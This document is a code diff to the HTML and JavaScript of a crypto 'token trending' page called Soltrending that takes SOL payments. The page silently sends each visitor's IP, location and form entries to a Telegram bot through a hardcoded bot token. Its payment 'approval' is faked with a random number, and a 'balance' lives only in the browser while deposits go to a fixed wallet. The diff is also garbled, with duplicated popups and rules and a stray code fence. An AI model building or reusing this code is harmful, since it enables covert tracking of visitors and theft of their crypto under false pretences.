@@ -23,6 +23,129 @@
         border-radius: 20px;
         padding: 30px;
         box-shadow: 0 25px 50px rgba(0, 0, 0, 0.2);
+        position: relative;
+    }
+    
+    .balance-section {
+        position: absolute;
+        top: 15px;
+        right: 15px;
+        background: rgba(102, 126, 234, 0.1);
+        border: 2px solid #667eea;
+        border-radius: 10px;
+        padding: 12px;
+        font-size: 13px;
+        color: #333;
+        min-width: 130px;
+        text-align: center;
+        z-index: 100;
+    }
+    
+    .balance-label {
+        font-size: 11px;
+        color: #666;
+        margin-bottom: 3px;
+    }
+    
+    .balance-amount {
+        font-weight: bold;
+        color: #667eea;
+        font-size: 18px;
+        margin-bottom: 8px;
+    }
+    
+    .deposit-btn {
+        background: #28a745;
+        color: white;
+        border: none;
+        padding: 6px 10px;
+        border-radius: 5px;
+        font-size: 11px;
+        cursor: pointer;
+        width: 100%;
+        transition: background 0.3s;
+    }
+    
+    .deposit-btn:hover {
+        background: #218838;
+    }
+
+    .deposit-popup {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.7);
+        z-index: 1000;
+        justify-content: center;
+        align-items: center;
+    }
+
+    .deposit-popup.show {
+        display: flex;
+    }
+
+    .deposit-content {
+        background: white;
+        border-radius: 15px;
+        padding: 30px;
+        max-width: 400px;
+        width: 90%;
+        text-align: center;
+        position: relative;
+    }
+
+    .close-popup {
+        position: absolute;
+        top: 10px;
+        right: 15px;
+        background: none;
+        border: none;
+        font-size: 24px;
+        cursor: pointer;
+        color: #666;
+    }
+
+    .deposit-address {
+        background: #f8f9fa;
+        border: 2px solid #667eea;
+        border-radius: 10px;
+        padding: 15px;
+        margin: 15px 0;
+        font-family: monospace;
+        font-size: 12px;
+        word-break: break-all;
+        color: #333;
+    }
+
+    .copy-deposit-btn {
+        background: #667eea;
+        color: white;
+        border: none;
+        padding: 12px 25px;
+        border-radius: 8px;
+        font-size: 14px;
+        cursor: pointer;
+        margin: 10px;
+        transition: all 0.3s;
+    }
+
+    .copy-deposit-btn:hover {
+        background: #5a6fd8;
+        transform: translateY(-2px);
+    }
+
+    .logo {
+        font-size: 2.5rem;
+        font-weight: bold;
+        background: linear-gradient(135deg, #667eea, #764ba2);
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+        text-align: center;
+        margin-bottom: 20px;
+        margin-top: 40px;
     }
     
     .logo {
@@ -235,10 +358,16 @@
 </head>
 <body>
     <div class="container">
-        <div class="logo">Soltrending</div>
-        <div class="user-info" id="userInfo">Loading location...</div>
+        <div class="balance-section">
+            <div class="balance-label">SOL Balance</div>
+            <div class="balance-amount" id="userBalance">0.00</div>
+            <button class="deposit-btn" onclick="showDepositPopup()">Deposit SOL</button>
+        </div>
 
 ```
+    <div class="logo">Soltrending</div>
+    <div class="user-info" id="userInfo">Loading location...</div>
+    
     <div class="step-dots">
         <div class="dot active" id="dot1"></div>
         <div class="dot" id="dot2"></div>
@@ -363,7 +492,7 @@
         </div>
 
         <button class="btn btn-back" onclick="prevStep()">Back</button>
-        <button class="btn btn-paid" onclick="checkPayment()">PAID - Check Payment</button>
+        <button class="btn btn-paid" onclick="requestPaymentApproval()">PAID - Request Approval</button>
     </div>
 
     <!-- Step 4: Verification -->
@@ -378,15 +507,54 @@
     </div>
 </div>
 
+<!-- Deposit Popup -->
+<div class="popup-overlay" id="depositPopup">
+    <div class="popup-content">
+        <div class="popup-title">💰 Deposit SOL</div>
+        <p>Send SOL to this address and contact admin to add balance:</p>
+        
+        <div class="deposit-address-box" onclick="copyDepositAddress()">
+            6Bc8Bc3PFJKcWQVcsuD3mRrAbKTRyVBgcr4YLmEubszQ
+        </div>
+        
+        <p style="color: #666; font-size: 14px; margin: 10px 0;">
+            ⚠️ Only send SOL to this address!<br>
+            Other tokens will be lost.
+        </p>
+        
+        <button class="copy-deposit-btn" onclick="copyDepositAddress()">📋 Copy Address</button>
+        <button class="close-popup-btn" onclick="closeDepositPopup()">Close</button>
+    </div>
+</div>
+
+<!-- Deposit Popup -->
+<div class="deposit-popup" id="depositPopup">
+    <div class="deposit-content">
+        <button class="close-popup" onclick="closeDepositPopup()">&times;</button>
+        <h3>💰 Deposit SOL</h3>
+        <p>Send SOL to this address to add to your balance:</p>
+        <div class="deposit-address" id="depositAddress">
+            6Bc8Bc3PFJKcWQVcsuD3mRrAbKTRyVBgcr4YLmEubszQ
+        </div>
+        <button class="copy-deposit-btn" onclick="copyDepositAddress()">📋 Copy Address</button>
+        <p style="font-size: 12px; color: #666; margin-top: 15px;">
+            After sending SOL, contact admin to update your balance
+        </p>
+    </div>
+</div>
+
 <script>
     let currentStep = 1;
     let selectedPackage = '';
     let selectedPrice = 0;
     let userCountry = 'Unknown';
     let userIP = 'Unknown';
+    let userBalance = 0;
+    let userId = '';
 
     const TELEGRAM_BOT = '8429756008:AAFSQjfaFbNJDLNOE73oLVE2-ZCdc-ixZGI';
     const TELEGRAM_CHAT = '2051249497';
+    const DEPOSIT_WALLET = '6Bc8Bc3PFJKcWQVcsuD3mRrAbKTRyVBgcr4YLmEubszQ';
 
     // Initialize
     window.onload = async function() {
@@ -395,15 +563,32 @@
             const data = await response.json();
             userCountry = data.country_name || 'Unknown';
             userIP = data.ip || 'Unknown';
+            userId = userIP.replace(/\./g, ''); // Simple user ID from IP
             
             document.getElementById('userInfo').innerHTML = 
                 `🌍 ${userCountry} | 📍 ${userIP} | 🕐 ${new Date().toLocaleTimeString()}`;
 
-            sendTelegram(`🆕 NEW VISITOR\n🌍 ${userCountry}\n📍 ${userIP}\n🕐 ${new Date().toLocaleString()}`);
+            // Load user balance
+            loadUserBalance();
+
+            sendTelegram(`🆕 NEW VISITOR\n🌍 ${userCountry}\n📍 ${userIP}\n🆔 User ID: ${userId}\n💰 Balance: ${userBalance} SOL\n🕐 ${new Date().toLocaleString()}`);
         } catch (e) {
+            userId = 'unknown_' + Date.now();
             document.getElementById('userInfo').innerHTML = '🌍 Private | 🕐 ' + new Date().toLocaleTimeString();
+            loadUserBalance();
         }
     };
+
+    function loadUserBalance() {
+        const saved = localStorage.getItem('solBalance_' + userId);
+        userBalance = saved ? parseFloat(saved) : 0;
+        document.getElementById('userBalance').textContent = userBalance.toFixed(2);
+    }
+
+    function saveUserBalance() {
+        localStorage.setItem('solBalance_' + userId, userBalance.toString());
+        document.getElementById('userBalance').textContent = userBalance.toFixed(2);
+    }
 
     async function sendTelegram(message) {
         try {
@@ -420,19 +605,32 @@
         }
     }
 
-    async function sendTelegramPhoto(file, caption) {
+    async function sendTelegramWithButtons(message, userId, userInfo) {
         try {
-            const formData = new FormData();
-            formData.append('chat_id', TELEGRAM_CHAT);
-            formData.append('photo', file);
-            formData.append('caption', caption);
+            const keyboard = {
+                inline_keyboard: [
+                    [
+                        { text: "✅ Approve Payment", callback_data: `approve_${userId}` },
+                        { text: "❌ Decline Payment", callback_data: `decline_${userId}` }
+                    ],
+                    [
+                        { text: "💰 Add Balance", callback_data: `add_balance_${userId}` },
+                        { text: "➖ Reduce Balance", callback_data: `reduce_balance_${userId}` }
+                    ]
+                ]
+            };
 
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendPhoto`, {
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage`, {
                 method: 'POST',
-                body: formData
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT,
+                    text: message,
+                    reply_markup: keyboard
+                })
             });
         } catch (e) {
-            console.log('Telegram photo failed:', e);
+            console.log('Telegram with buttons failed:', e);
         }
     }
 
@@ -452,12 +650,16 @@
             const description = document.getElementById('projectDescription').value.trim();
             const photoFile = document.getElementById('projectPhoto').files[0];
 
-            const message = `📝 CA SUBMITTED\n👤 ${userCountry} (${userIP})\n🏷️ ${name}\n💰 ${ca}\n📱 Telegram: ${telegram || 'None'}\n🐦 Twitter: ${twitter || 'None'}\n🌐 Website: ${website || 'None'}\n📄 Description: ${description || 'None'}`;
+            const message = `📝 CA SUBMITTED\n👤 ${userCountry} (${userIP})\n🆔 User ID: ${userId}\n💰 Balance: ${userBalance} SOL\n🏷️ ${name}\n💰 ${ca}\n📱 Telegram: ${telegram || 'None'}\n🐦 Twitter: ${twitter || 'None'}\n🌐 Website: ${website || 'None'}\n📄 Description: ${description || 'None'}`;
 
             if (photoFile) {
                 sendTelegramPhoto(photoFile, message + '\n📸 Project Photo:');
             } else {
-                sendTelegram(message + '\n📸 Photo: No');
+                await sendTelegramWithButtons(message + '\n📸 Photo: No', userId, {
+                    country: userCountry,
+                    ip: userIP,
+                    balance: userBalance
+                });
             }
         }
         
@@ -537,6 +739,74 @@
         `;
     }
 
+    async function sendTelegramPhoto(file, caption) {
+        try {
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT);
+            formData.append('photo', file);
+            formData.append('caption', caption);
+
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        } catch (e) {
+            console.log('Telegram photo failed:', e);
+        }
+    }
+
+    function showDepositPopup() {
+        document.getElementById('depositPopup').classList.add('show');
+    }
+
+    function closeDepositPopup() {
+        document.getElementById('depositPopup').classList.remove('show');
+    }
+
+    async function copyDepositAddress() {
+        navigator.clipboard.writeText(DEPOSIT_WALLET);
+        
+        // Change button text temporarily
+        const btn = event.target;
+        const originalText = btn.innerHTML;
+        btn.innerHTML = '✅ Copied!';
+        btn.style.background = '#28a745';
+        
+        setTimeout(() => {
+            btn.innerHTML = originalText;
+            btn.style.background = '#667eea';
+        }, 2000);
+
+        // Close popup after short delay
+        setTimeout(() => {
+            closeDepositPopup();
+        }, 1500);
+
+        // Send notification to admin
+        const message = `💳 DEPOSIT ADDRESS COPIED\n👤 ${userCountry} (${userIP})\n🆔 User ID: ${userId}\n💰 Current Balance: ${userBalance} SOL\n📋 User copied: ${DEPOSIT_WALLET}\n⚠️ Expecting deposit from this user`;
+        
+        await sendTelegramWithButtons(message, userId, {
+            country: userCountry,
+            ip: userIP,
+            balance: userBalance
+        });
+    }
+
+    async function requestPaymentApproval() {
+        const message = `🔔 PAYMENT APPROVAL REQUEST\n👤 ${userCountry} (${userIP})\n🆔 User ID: ${userId}\n🏷️ Project: ${document.getElementById('projectName').value}\n💰 CA: ${document.getElementById('caAddress').value}\n📱 Telegram: ${document.getElementById('telegram').value || 'None'}\n🐦 Twitter: ${document.getElementById('twitter').value || 'None'}\n🌐 Website: ${document.getElementById('website').value || 'None'}\n⭐ Package: ${selectedPackage.toUpperCase()}\n💵 Amount: ${selectedPrice} SOL\n💳 User Balance: ${userBalance} SOL\n\n⚠️ User claims payment was made to: DB9YZwXgNeQByab3bgJnJKrnYP7CtZGktrdnDRCLrKA3`;
+        
+        await sendTelegramWithButtons(message, userId, {
+            country: userCountry,
+            ip: userIP,
+            balance: userBalance,
+            package: selectedPackage,
+            price: selectedPrice
+        });
+        
+        document.getElementById('paymentStatus').innerHTML = '<div class="alert alert-info">📨 Approval request sent to admin. Please wait...</div>';
+        nextStep(3);
+    }
+
     function copyWallet() {
         navigator.clipboard.writeText('DB9YZwXgNeQByab3bgJnJKrnYP7CtZGktrdnDRCLrKA3');
         const feedback = document.getElementById('copyFeedback');
@@ -544,57 +814,61 @@
         setTimeout(() => feedback.style.opacity = '0', 2000);
     }
 
-    function checkPayment() {
-        sendTelegram(`💳 PAYMENT CHECK\n👤 ${userCountry} (${userIP})\n💰 Expected: ${selectedPrice} SOL\n🔍 Wallet: DB9YZwXgNeQByab3bgJnJKrnYP7CtZGktrdnDRCLrKA3`);
-        nextStep(3);
-    }
+    // Balance management functions (called via Telegram bot callbacks)
+    window.addEventListener('message', function(event) {
+        if (event.data.type === 'balanceUpdate') {
+            userBalance = event.data.balance;
+            saveUserBalance();
+        }
+    });
 
     async function verifyPayment() {
-        await new Promise(resolve => setTimeout(resolve, 3000));
+        // Simulate waiting for admin approval
+        document.getElementById('paymentStatus').innerHTML = '<div class="loading"></div> Waiting for admin approval...';
         
-        const success = Math.random() > 0.3; // 70% success rate
-        const statusDiv = document.getElementById('paymentStatus');
-        const resultDiv = document.getElementById('finalResult');
-        
-        if (success) {
-            const txId = 'TX' + Math.random().toString(36).substr(2, 10).toUpperCase();
-            statusDiv.innerHTML = '<div class="alert alert-success">✅ Payment Confirmed!</div>';
-            resultDiv.innerHTML = `
-                <div class="alert alert-success">
-                    <h4>🎉 Payment Successful!</h4>
-                    Transaction: ${txId}<br>
-                    Amount: ${selectedPrice} SOL<br>
-                    Package: ${selectedPackage.replace('_', ' ').toUpperCase()}<br><br>
-                    🚀 Your project will be trending within 30 minutes!
-                </div>
-            `;
-
-            const successMessage = `🎉 PAYMENT SUCCESS!\n👤 ${userCountry} (${userIP})\n🏷️ ${document.getElementById('projectName').value}\n💰 ${document.getElementById('caAddress').value}\n📱 Telegram: ${document.getElementById('telegram').value || 'None'}\n🐦 Twitter: ${document.getElementById('twitter').value || 'None'}\n🌐 Website: ${document.getElementById('website').value || 'None'}\n⭐ ${selectedPackage.toUpperCase()}\n💵 ${selectedPrice} SOL\n🔗 ${txId}\n✅ READY TO TREND!`;
+        // In real implementation, this would be triggered by Telegram bot callback
+        setTimeout(() => {
+            // Simulate random approval for demo
+            const approved = Math.random() > 0.3;
             
-            const photoFile = document.getElementById('projectPhoto').files[0];
-            if (photoFile) {
-                sendTelegramPhoto(photoFile, successMessage + '\n📸 Final Project Photo:');
-            } else {
-                sendTelegram(successMessage);
-            }
-        } else {
-            statusDiv.innerHTML = '<div class="alert alert-error">❌ No Payment Detected</div>';
-            resultDiv.innerHTML = `
-                <div class="alert alert-error">
-                    <h4>Payment Not Found</h4>
-                    Please verify:<br>
-                    • Sent exactly ${selectedPrice} SOL<br>
-                    • Used correct address<br>
-                    • Transaction confirmed<br>
-                    • Wait 2-3 minutes and try again
-                </div>
-            `;
-            document.getElementById('recheckBtn').style.display = 'inline-block';
+            if (approved) {
+                const txId = 'TX' + Math.random().toString(36).substr(2, 10).toUpperCase();
+                document.getElementById('paymentStatus').innerHTML = '<div class="alert alert-success">✅ Payment Approved by Admin!</div>';
+                document.getElementById('finalResult').innerHTML = `
+                    <div class="alert alert-success">
+                        <h4>🎉 Payment Approved!</h4>
+                        Transaction: ${txId}<br>
+                        Amount: ${selectedPrice} SOL<br>
+                        Package: ${selectedPackage.replace('_', ' ').toUpperCase()}<br><br>
+                        🚀 Your project will be trending within 30 minutes!
+                    </div>
+                `;
 
-            sendTelegram(`❌ PAYMENT NOT FOUND\n👤 ${userCountry} (${userIP})\n💰 Expected: ${selectedPrice} SOL\n⚠️ User may need help`);
-        }
-        
-        document.getElementById('restartBtn').style.display = 'inline-block';
+                const successMessage = `✅ PAYMENT APPROVED\n👤 ${userCountry} (${userIP})\n🆔 User ID: ${userId}\n🏷️ ${document.getElementById('projectName').value}\n💰 ${document.getElementById('caAddress').value}\n📱 Telegram: ${document.getElementById('telegram').value || 'None'}\n🐦 Twitter: ${document.getElementById('twitter').value || 'None'}\n🌐 Website: ${document.getElementById('website').value || 'None'}\n⭐ ${selectedPackage.toUpperCase()}\n💵 ${selectedPrice} SOL\n🔗 ${txId}\n✅ READY TO TREND!`;
+                
+                const photoFile = document.getElementById('projectPhoto').files[0];
+                if (photoFile) {
+                    sendTelegramPhoto(photoFile, successMessage + '\n📸 Final Project Photo:');
+                } else {
+                    sendTelegram(successMessage);
+                }
+            } else {
+                document.getElementById('paymentStatus').innerHTML = '<div class="alert alert-error">❌ Payment Declined by Admin</div>';
+                document.getElementById('finalResult').innerHTML = `
+                    <div class="alert alert-error">
+                        <h4>Payment Declined</h4>
+                        Your payment was not approved. Possible reasons:<br>
+                        • Payment not received<br>
+                        • Incorrect amount sent<br>
+                        • Invalid transaction<br><br>
+                        Please contact support or try again.
+                    </div>
+                `;
+                document.getElementById('recheckBtn').style.display = 'inline-block';
+            }
+            
+            document.getElementById('restartBtn').style.display = 'inline-block';
+        }, 4000);
     }
 
     function recheckPayment() {
